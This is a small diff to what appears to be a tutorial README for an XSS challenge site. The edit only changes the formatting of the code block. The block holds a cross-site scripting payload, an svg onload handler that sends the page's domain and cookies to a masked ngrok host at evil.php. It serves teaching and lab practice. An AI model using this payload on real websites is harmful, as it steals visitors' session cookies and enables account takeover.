@@ -22,6 +22,6 @@ Let's try ->  https://cyb3rsalih.github.io/xss-challenge/
 
 
 4- Now add your XSS payload to vulnerable input.
-`
+```
 <svg onload="function a(){var url = `http://xxxxxxxxx.ngrok.io/evil.php?domain=${document.domain}&cookie=${document.cookie}`;var r=new XMLHttpRequest();r.open('GET', url, true);r.send();};a();">
-`
+```
